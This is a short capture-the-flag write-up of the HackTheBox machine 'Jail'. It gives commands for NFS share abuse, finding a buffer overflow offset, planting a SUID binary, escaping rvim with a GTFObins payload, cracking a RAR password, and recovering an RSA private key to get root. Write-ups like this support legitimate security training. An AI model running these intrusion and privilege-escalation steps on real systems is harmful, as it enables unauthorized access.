HTB-Jail-Writeup
(half-assed)
IP : 10.10.10.34

Nmap
----
- nmap found 6 open ports 
	- 22 running OpenSSH 6.6.1
	- 80 running Apache httpd 2.4.6
	- 111 running rpcbind 
	- 2049 running nfs
	- 7411 running daqstream
	- 20048 running mountd

- based on apache version the host is likely running Centos 7.4
- the RPC and mountd are both in support for NFS

Enumeration
-----------
- visiting port 80 we see ASCII art of a jail
- checking the response headers doesnt give us any leads
- we try directory brute forcing the host and got a new path 
	- /jailuser

- visiting /jailuser path we get few files 
	- compile.sh
	- jail
	- jail.c

- we can download all these files to out local machine using wget
- we will check these file later 
- we can list the shares on the host using the command 
	
	showmount -e 10.10.10.34

- there are 2 shares available
	- /opt
	- /var/nfsshare

- the Access Control List for both the shares is * which means anyone can mount them 
- we can mount the shares 

	sudo mount -t nfs 10.10.10.34:/opt /mnt/opt/
	sudo mount -t nfs 10.10.10.34:/var/nfsshare /mnt/nfsshare

- the /opt share is owned by root but readable to us
- on checking the share we found a bash script that reads a file named checkproc.log   
- the /var/nfsshare is owned by root and writable to us 
- on checking this share we find nothing

Shell as nobody
---------------
- on checking the compile.sh script from before we understood that it compiles, installs and restarts the jail service
- it is using execstack which means that data execution prevention is disabled and we can overflow the buffer
- we can exploit this vulnerability in our favour and write shellcode directly to the stack
- checking with file command we understood that jail is a 32 bit ELF executable generated by jail.c and compile.sh
- inspecting the jail.c code for more insight on how this works 
- on checking the code we got hardcoded credentials 

	creds : admin : 1974jailbreak!

- the program takes auth and prints up a message depending on the command 
	- USER
	- PASS
	- DEBUG 

- we can try to connect to this via netcat 

	nc 10.10.10.34 7411
	USER admin
	PASS 1974jailbreak!

	nc 10.10.10.34 7411
	DEBUG
	USER admin
	PASS 1974jailbreak!

- the DEBUG mode is leaking the address of the userpass buffer

	Debug: userpass buffer @ 0xffffd610

- we can try buffer overflow on the user input 
- on every attempt the address of the userpass buffer stayed static
- we can start jail with gdb debugger
	
	  sudo gdb -q -p $(pidof jail)
	  set follow-fork-mode child
	  set detach-on-fork off 
	  info inferiors
	  inferior 1
	  c

- now we can connect to jail using a third window with netcat and send a long string of A as password

	nc 127.0.0.1 7411
	USER admin
	PASS AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

- this hangs in netcat but on looking at gdb we see our long string of A overwritten into the EIP 
- now we need to find the offset 

	pattern_create 40
	inferior 1
	c

- we can connect again with netcat and this time send the buffer as the password

	nc 127.0.0.1 7411
	USER admin
	PASS AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAa

- at gdb we can see a crash 
- looks like after 28 bytes we control EIP 

	pattern_offset 0x413b4141
	python -c 'print("A"*28 + "BBBB")'
	nc 127.0.0.1 7411
	USER admin
	PASS AAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB

- it crashes at 0x42424242 
- we can connect to this and run a shellcode to get a shell back
- refer 0xdf blog for details
- we got a shell as nobody

Shell as frank
--------------
- we notice that on running id command we get uid, gid, groups and context 
- context is a feature of SELinux which is a a hardened linux that prevents certain behaviours to improve security  
- the nobody user cannot access the home directory 
- checking the sudo rights 
	
	sudo -l

- we see that nobody can run /opt/logreader/logreader.sh as frank with no password 
- we can check /etc/exports to see how these shares are mounted 
- a short c code and save it as lord.c

	#define _GNU_SOURCE
	#include <stdlib.h>
	#include <unistd.h>

	int main(void) {
	    setresuid(1000, 1000, 1000);
	    system("/bin/bash");
	    return 0;
	} 

- we can save this over NFS into /var/nfsshare and set it as SUID 

	gcc lord.c -o /mnt/nfsshare/lord
	chmod 4777 /mnt/nfsshare/lord

- since the users are not squashed the files will get owned as user 1000 which is the local user in our box (lord) and frank when in jail 
- we can run this via the shell we got earlier as nobody 

	/var/nfsshare/lord

- we got a shell as frank
- we can get a more stable shell by adding a ssh key and connecting via port 22
	
	cd ~/.ssh
	echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDIK/xSi58QvP1UqH+nBwpD1WQ7IaxiVdTpsg5U19G3d nobody@nothing" >> ~/.ssh/authorized_keys

	ssh -i ~/keys/ed25519_gen frank@10.10.10.34

- we have a stable shell as frank on the box 
- grab the user flag

Shell as adm
------------
- checking sudo rights for frank we can see that there is another sudo command we can run as adm with no password 

	sudo -l
	(adm) NOPASSWD: /usr/bin/rvim /var/www/html/jailuser/dev/jail.c

- when we try to open jail.c using the sudo rights allocated to us we are dropped into a rvim (restricted vim) window with the contents of jail.c

	sudo -u adm /usr/bin/rvim /var/www/html/jailuser/dev/jail.c

- we can try to get a shell out of this by the usual method of running !bash on vim but it didnt work as this is restricted vim
- we checked GTFObins and found a way to get a shell using rvim 

	:py import os; os.execl("/bin/sh", "sh", "-c", "reset; exec sh")

- we get a shell as adm
- the shell is running python commands
- we can run this instead to get more stable shell

	:py import pty;pty.spawn("/bin/bash")

Priv-esc
--------
- we can start by looking at files owned by adm and we got a few in /var/*
- the /var/adm/.keys/note.txt defines what the password system is for the organization

	"Note from Administrator:
	Frank, for the last time, your password for anything encrypted must be your last name followed by a 4 digit number and a symbol."

- the /var/adm/.keys/keys.rar contains roots public key 
- trying to unrar it shows its encrypted and requires a password to do so 
- the /.local/.frank looks like gibberish
	
	"Szszsz! Mlylwb droo tfvhh nb mvd kzhhdliw! Lmob z uvd ofxpb hlfoh szev Vhxzkvw uiln Zoxzgiza zorev orpv R wrw!!!"

- there are sites like quipquip that decodes ciphers like this
- on decoding this we got 

	"	Hahaha! Nobody will guess my new password! Only a few lucky souls have Escaped from Alcatraz alive like I did!!!"

- alcatraz was a maximum security prison owned my US
- googling more about this we found names of 3 people who have succesfully escaped from alcatraz
	- John Anglin
	- Clarence Anglin
	- Frank Morris

- we got the full name of the user frank 
- we can use this to create a wordlist as per the details we have from before 
- we can use hashcat to generate a wordlist

	/opt/hashcat-6.2.5/hashcat.bin --stdout -a 3 Morris?d?d?d?d?s > frank-passwords

- we can get the keys.rar file from the box to our machine 
- drop the keys.rar into /tmp and make it world readable and scp it to our box 

	 cp keys.rar /tmp/
	chmod 666 /tmp/keys.rar

	scp -i ~/keys/ed25519_gen frank@10.10.10.34:/tmp/keys.rar .

- we can run rar2john on keys.rar to generate a hash and crack it with hashcat 
- we got the password as Morris1962!

	creds : Morris1962!

- we can extract the file 

	unrar e keys.rar 

- we got authorizedkeys.pub
- we need to crack the public key now 
- we can use RsaCtfTool from github to do this 
- git clone and get it ready to go 
- use the --private so that it will show the private key if it cracks it

	/opt/RsaCtfTool/RsaCtfTool.py --publickey rootauthorizedsshkey.pub --private 

- we successfully cracked it and we got the private key 
- save this to a file and chmod 600 so that we can use it with SSH

	ssh -i ~/keys/jail-root root@10.10.10.34

- we got shell as root 
- grab the root flag
